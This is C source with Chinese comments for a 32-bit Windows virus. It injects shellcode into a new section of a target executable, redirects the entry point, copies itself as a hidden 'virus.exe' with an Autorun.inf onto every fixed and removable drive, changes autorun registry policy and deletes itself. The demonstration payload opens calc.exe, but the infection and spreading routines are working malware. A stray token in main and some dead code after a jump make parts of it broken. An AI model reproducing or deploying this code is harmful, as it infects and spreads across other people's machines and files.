#include <windows.h>
#include <stdio.h>
#include <ntddk.h>

//不显示UI
//#pragma comment(linker,"/subsystem:windows /entry:main")

//此宏可实现代码重定位
//#define RECODE(A){_asm call A _asm A: _asm pop ebx _asm lea eax,A _asm sub ebx,eax}

//恶意代码入口
#pragma code_seg(".payload")
#pragma comment(linker,"/SECTION:.payload,RWE")
#pragma optimize("", off)

// 【EntryPoint】：仅4字节OEP占位，感染器运行时写入原OEP绝对地址
void __declspec(naked) EntryPoint(){
	__asm{
		// =======前4字节：原OEP占位符（感染器运行时写入）===========
		// 感染器会把原OEP绝对地址写到新节的最开头（即这4字节）
		__emit 0x00
		__emit 0x00
		__emit 0x00
		__emit 0x00
	}
}

// 【BeginPoint】：shellcode真正入口，新EP指向这里
void __declspec(naked) BeginPoint() {
	__asm{
		

		// =========BeginPoint:真正的代码从这里开始，新EP指向此处========
		// ====================================
		// [第1步 & 第2步] 代码重定位（获取运行时EIP）
		// ====================================
		call get_eip
	get_eip:
		pop ebx						// EBX = runtime address of get_eip label
		sub ebx, offset BeginPoint	// EBX = runtime_get_eip - static_BeginPoint
		sub ebx,5					// EBX = delta(runtime - compile_time)

		// =====================================
		// [第三步]通过PEB获取Kernel32.dll基址
		// FS:[0x30] -> PEB -> Ldr -> InInitialzationOrderModuleList
		// 链表顺序: ntdll.dl -> kernel32.dll -> ...
		// ======================================
		// [第3步] 获取Kernel32基址（Win7+写法）
		mov eax, fs:[0x30]			// PEB
		mov eax, [eax+0x0C]			// PEB.Ldr
		mov esi, [eax+0x1C]			// Ldr.InInitialzatinOrderModuleList.Flink
		lodsd						// EAX = 第1个模块(ntdll)的链表节点
		mov eax, [eax]				// EAX = 第2个模块(kernel32)的链表节点
		mov edi, [eax+0x08]			// EDI = Kernel32基址

		// [第4步] 解析导出表，获取GetProcAddress
		mov eax, [edi+0x3C]			// e_lfanew
		add eax, edi
		mov eax, [eax+0x78]			// 导出表RVA
		add eax, edi
		mov esi, eax					// ESI = 导出表RVA

		mov ecx, [esi+0x18]				// NumberOfNames
		mov edx, [esi+0x20]				// AddressOfNames RVA
		add edx, edi					// EDX = AddressOfName RVA

	find_gpa_loop:
		dec ecx
		js gpa_not_found
		mov eax,[edx+ecx*4]
		add eax, edi
		cmp dword ptr [eax], 0x50746547		// "GetP"
		jne find_gpa_loop
		cmp dword ptr [eax+4], 0x41636F72	// "rocA"
		jne find_gpa_loop
		cmp dword ptr [eax+8], 0x65726464	// "ddre"
		jne find_gpa_loop
		cmp word ptr [eax+12], 0x7373		// "ss"
		jne find_gpa_loop

		// 通过序号表和函数表取得函数地址
		mov edx, [esi+0x24]						// AddressOfNameOrdinals RVA
		add edx, edi
		movzx ecx, word ptr [edx + ecx *2]
		mov edx, [esi+0x1C]						// AddressOfFunctions RVA
		add edx, edi
		mov eax, [edx+ecx*4]
		add eax, edi
		mov ebp, eax						// EBP = GetProcAddress（全程保存）
		jmp gpa_found
	
	gpa_not_found:
		int 3								// 找不到则中断（调试用）

	gpa_found:
		// [第5步]获取LoadLibraryA
		xor ecx,ecx
		push ecx
		push 0x41797261					// "aryA"
		push 0x7262694C					// "Libr"
		push 0x64616F4C					// "Load"
		mov eax, esp					// EAX = "LoadLibraryA"
		push eax						// arg2:lpProcName
		push edi						// arg1:kernel32
		call ebp						// GetPrcAddress(kernel32,"LoadLibraryA")
		add esp, 16						// 清理字符串(4 DWORD)
		mov esi, eax					// ESI = LoadLibraryA

		// [第5步] 加载shell32.dll
		xor ecx,ecx
		push ecx
		push 0x006C6C64					// "dll\0"
		push 0x2E32336C					// "l32."
		push 0x6C656873					// "shel"
		mov eax, esp					// EAX= "shell32.dll"
		push eax						// arg1:lpLibFileName
		call esi						// LoadLibraryA("shell32.dll")
		add esp, 16						// 清理字符串(4 DWORD)
		mov edi, eax					// EDI = shell32基址

		// [第6步] 获取ShellExecuteA
		xor ecx,ecx
		push ecx
		push 0x00000041					// "A\0\0\0"
		push 0x65747563					// "cute"
		push 0x6578456C					// "lExe"
		push 0x6C656853					// "Shel"
		mov eax,esp						// EAX = "ShellExecuteA"
		push eax						// arg2:lpProcName
		push edi						// arg1:shell32
		call ebp						//GetProcAddress(shell32,"ShellExecuteA")
		add esp, 20						// 清理字符串(5 DWORD)
		mov esi, eax					// ESI = ShellExecuteA

		// [第6步] 执行ShellExecuteA(NULL,NUL,"calc.exe",NULL,NULL,SW_SHOW)
		xor edx,edx
		push edx						// null terminator
		push 0x6578652E					// ".exe"
		push 0x636C6163					// "calc"
		mov ecx, esp					// ECX ="calc.exe"

		push 5							// nShowCmd = SW_SHOW
		push edx						// lpDirectory = NULL
		push edx						// lpParameters = NULL
		push ecx						// lpFile = "calc.exe"
		push edx						// lpOperation = NULL
		push edx						// hwnd = NULL
		call esi						// ShellExecuteA(...)[stdcall 自清栈24字节]
		add esp,12						// 清理"calc.exe"字符串(3 DWORD)

		// [第七步] 跳回原OEP(支持ASLR)
		// 原OEP绝对地址存在EntryPoint开头的4字节
		// 运行时地址 = EBX(delta) + 静态EntryPoint偏移 - 静态get_eip偏移+ ...
		// 简化：利用EBX直接定位到EntryPoint起始处读取4字节

		// EBX = runtime_get_eip - static_get_eip
		// static EntryPoint = static get_eip - (get_ei到BegiPoint的偏移) - 4
		// 设diff=offset get_eip - offset BeginPoint + 4（编译器计算）
		//（错误）lea eax, [ebx + offset EntryPoint - offset get_eip]
		//mov eax, offset EntryPoint		// EAX = static_EntryPoint
		//add eax,ebx						// EAX = static_EntryPoint + delta = runtime_EntryPoint
		// 读取存储的OEP RVA
		mov ecx, offset EntryPoint		// 静态地址(编译时)
		add ecx, ebx					//runtime EntryPoint 地址
		mov ecx, [ecx]					//存储的OEP RVA

		//从PEB获取运行时ImageBase(PEB+0x08)
		mov eax, fs:[0x30]				//PEB
		mov eax, [eax+0x08]				//PEB.ImageBaseAddress(自动处理ASLR!)

		// 计算真实OEP
		add eax, ecx					// runtime ImageBase + OEP RVA = 真实OEP
		jmp eax

		// 等价于：runtime_EntryPoint = delta + static_EntryPoint
		//等价于：运行时的EntryPoint地址
		//读取前4字节(感染器写入的原OEP)
		mov eax, [eax]
		jmp eax							// 跳回原OEP,宿主继续正常运行

	}
}

void __declspec(naked) EndPoint(){
	__asm ret
}
#pragma optimize("", on)
#pragma code_seg()

// 对齐宏
#define Align(x,align)(((x)+(align)-1)&~((align)-1))
///////////////////////////////////////
//修改注册表,实现自动运行
///////////////////////////////////////
BOOL SetAutorun(void)
{
	HKEY hKey;
	long iret = RegOpenKey(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",&hKey);
	if(iret!=ERROR_SUCCESS)
	{
		return FALSE;
	}
	DWORD dwValue = 145;
	iret = RegSetValueEx(hKey,L"NoDriveTypeAutorun",NULL,REG_DWORD,(PBYTE)&dwValue,4);
	if(iret!=ERROR_SUCCESS)
	{
		return FALSE;
	}
	RegCloseKey(hKey);
	return TRUE;
}

//////////////////////////////////////
//模拟打开盘符
////////////////////////////////////////
BOOL OpenPath(void)
{
	//获取当前目录
	char path[MAX_PATH]={0};
	GetModuleFileNameA(NULL,path,MAX_PATH);
	path[strlen(path)-9]='\0';
	//打开当前目录
	ShellExecuteA(NULL,NULL,path,NULL,NULL,SW_SHOWNORMAL);
	return TRUE;
}

/////////////////////////////////////
//感染各驱动盘
////////////////////////////////////
BOOL InfectDriver(void)
{
	for(char ch='A';ch<='Z';ch++)
	{
		//存储释放路径，先构造盘符
		char path[MAX_PATH]={ch,':'};
		
		//只感染硬盘和U盘类
		if(GetDriveTypeA(path)==DRIVE_FIXED||GetDriveTypeA(path)==DRIVE_REMOVABLE)
		{
			char p[MAX_PATH]={0};
			memcpy(p,path,MAX_PATH);

			//释放的EXE路径
			strcat(path,"\\virus.exe");
			char temp[MAX_PATH]={0};
			//获取本程序路径
			GetModuleFileNameA(NULL,temp,MAX_PATH);
			//复制文件
			CopyFileA(temp,path,false);
			//设置文件属性为系统|隐藏
			SetFileAttributesA(path,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);

			//使用Autorun实现启动
			strcat(p,"\\Autorun.inf");
			//重新生成Autorun.inf
			DeleteFileA(p);
			FILE *fp=fopen(p,"a");
			memset(temp,0,MAX_PATH);
			//Autorun.inf的写法
			memcpy(temp,"[Autorun]\nOPEN=virus.exe\nshell\\open=打开(&O)\nshell\\open\\Command=virus.exe\nshell\\open\\Default=1\nshell\\explore=资源管理器(&X)\nshell\\explore\\Command=virus.exe",MAX_PATH);
			fputs(temp,fp);
			fclose(fp);
			SetFileAttributesA(p,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
		}
	}
	return TRUE;
}

BOOL InfectPE(LPCSTR filePath)
{
	//打开文件
	HANDLE hFile = CreateFileA(filePath,GENERIC_READ|GENERIC_WRITE,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		DWORD err = GetLastError();
		printf("打开文件失败，错误码: %lu\n", err);
		return FALSE;
	}
	//创建内存文件映射
	HANDLE hMapFile = CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,0,NULL);
	if (hMapFile == NULL) { 
		printf("创建映射失败，错误码：%lu\n",GetLastError()); 
		CloseHandle(hFile);
		return FALSE;
	}
	//把文件映射到内存
	LPVOID pHdr = MapViewOfFile(hMapFile,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
	if (pHdr == NULL) { 
		printf("映射视图失败，错误码：%lu\n",GetLastError());
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//////////////////////////////////////
	//对文件进行相关操作
	//////////////////////////////
	//1.增加新区段
	//PE头指针:文件头指针+DOS头的e_lfanew位指定的PE头偏移
	// ---- 验证 DOS 签名 ----
	IMAGE_DOS_HEADER *pDosHdr = (IMAGE_DOS_HEADER*)pHdr;
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[-] 不是有效的PE文件（MZ签名错误）\n");
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr+pDosHdr->e_lfanew);
	// ---- 验证 PE 签名 ----
	if (pNTHdr->Signature != IMAGE_NT_SIGNATURE) {
		printf("[-] 不是有效的PE文件（PE签名错误）\n");
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}
	// ---- 只支持32位x86 ----
	if (pNTHdr->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
		printf("[-] 不支持的架构: 0x%X（仅支持32位x86，此文件可能是64位）\n",
			pNTHdr->FileHeader.Machine);
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}
	if (pNTHdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
		printf("[-] 不是32位PE（Magic=0x%X）\n", pNTHdr->OptionalHeader.Magic);
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}
	
	
	//节区头指针：PE头指针+PE头的长度
	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr+sizeof(IMAGE_NT_HEADERS));
	WORD wNumSec = pNTHdr->FileHeader.NumberOfSections;
	DWORD dwSecAlign = pNTHdr->OptionalHeader.SectionAlignment;
	//最后一个字节
	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections - 1];
	//定义一个新节
	IMAGE_SECTION_HEADER *pNewSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections];
	
		// ---- 检查是否已被感染（节名判断） ----
	for (WORD i = 0; i < wNumSec; i++) {
		if (memcmp(pSecHdr[i].Name, ".0xQo", 5) == 0) {
			printf("[-] 文件已被感染，跳过\n");
			UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
			return FALSE;
		}
	}
	// ---- 检查节区头空间是否足够 ----
	DWORD dwNewSecHdrEnd  = (DWORD)((PBYTE)(pNewSec + 1) - (PBYTE)pHdr);
	DWORD dwFirstSecOffset = pSecHdr[0].PointerToRawData;
	if (dwNewSecHdrEnd > dwFirstSecOffset) {
		printf("[-] PE头没有足够空间添加新节区头！\n");
		printf("    需要: %lu 字节，可用: %ld 字节\n",
			sizeof(IMAGE_SECTION_HEADER),
			(LONG)(dwFirstSecOffset - ((DWORD)((PBYTE)pNewSec - (PBYTE)pHdr))));
		UnmapViewOfFile(pHdr); CloseHandle(hMapFile); CloseHandle(hFile);
		return FALSE;
	}


	//2.填充新增区段
	//感染的代码长度
	DWORD dwCodeSize = (DWORD)EndPoint - (DWORD)&EntryPoint;
	//填充新节的各字段
	memcpy(pNewSec->Name,".0xQo",6);
	pNewSec->PointerToRawData = pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->VirtualAddress = pLastSec->VirtualAddress + Align(pLastSec->Misc.VirtualSize,dwSecAlign);
	pNewSec->SizeOfRawData = Align(dwCodeSize,dwSecAlign);
	pNewSec->Misc.VirtualSize = Align(dwCodeSize,dwSecAlign);
	pNewSec->Characteristics = IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_CNT_CODE;


	//修正PE镜像大小
	//节区数目加1
	pNTHdr->FileHeader.NumberOfSections++;
	//扩充SizeofCode和SizeofImage字段
	pNTHdr->OptionalHeader.SizeOfCode += pNewSec->Misc.VirtualSize;
	pNTHdr->OptionalHeader.SizeOfImage += pNewSec->Misc.VirtualSize;
	
	//写入shelcode到新节
	DWORD dwSize = 0;
	SetFilePointer(hFile,pNewSec->PointerToRawData,NULL,FILE_BEGIN);
	WriteFile(hFile,&EntryPoint,pNewSec->Misc.VirtualSize,&dwSize,NULL);
	SetEndOfFile(hFile);

	//设置新的入口点
	//DWORD dwOldEntryPoint = pNTHdr->OptionalHeader.AddressOfEntryPoint + pNTHdr->OptionalHeader.ImageBase;
	DWORD dwOldOEP_RVA = pNTHdr->OptionalHeader.AddressOfEntryPoint;//只存RVA!
	SetFilePointer(hFile,pNewSec->PointerToRawData,NULL,FILE_BEGIN);
	WriteFile(hFile,&dwOldOEP_RVA,4,&dwSize,NULL);
	
	//设置新OEP指向BeginPoint
	pNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress + (DWORD)BeginPoint - (DWORD)&EntryPoint;


	//保存修改内容
	FlushViewOfFile(pHdr,0);

	//关闭文件映射、关闭文件
	UnmapViewOfFile(pHdr);
	CloseHandle(hMapFile);
	CloseHandle(hFile);

	printf("[+] 感染完成: %s\n", filePath);
	printf("BeginPoint - EntryPoint = %d (应为4，否则填充影响了计算)\n",
       (DWORD)&BeginPoint - (DWORD)&EntryPoint);
	printf("sub ebx 应该减去: %d\n",
       (DWORD)&BeginPoint - (DWORD)&EntryPoint + 5);
	printf("    原OEP RVA     : 0x%08X\n", dwOldOEP_RVA);

	

	return TRUE;
}

////////////////////////////////////
//自删除
////////////////////////////////////
BOOL SelfDelete(void)
{
	char szModule[MAX_PATH];
	char szComspec[MAX_PATH];
	char szParams[MAX_PATH];

	//获得此文件名
	if(GetModuleFileNameA(0,szModule,MAX_PATH)!=0&&GetShortPathNameA(szModule,szModule,MAX_PATH)!=0&&GetEnvironmentVariableA("COMSPEC",szComspec,MAX_PATH)!=0)
	{
		//设置命令参数,构造远程进程命令参数
		lstrcpyA(szParams," /c del ");
		lstrcatA(szParams,szModule);
		lstrcatA(szParams," > nul");
		lstrcatA(szComspec,szParams);

		//填充结构体
		STARTUPINFOA si = {0};
		PROCESS_INFORMATION pi = {0};
		si.cb=sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		//为程序设置实时优先级
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_TIME_CRITICAL);

		//创建远程进程
		if(CreateProcessA(0,szComspec,0,0,0,CREATE_SUSPENDED|DETACHED_PROCESS,0,0,&si,&pi))
		{
			//暂停一直到该程序退出再执行
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);

			//以低级别恢复批处理
			ResumeThread(pi.hThread);
			return TRUE;
		}else{
			SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_NORMAL);
		}

	}
	return FALSE;
}

int main(int argc,char *argv[]){
	InfectPE(argv[1]);
	SelfDelete();
	LDR_DATA_TABLE_ENTRY
	return 0;
}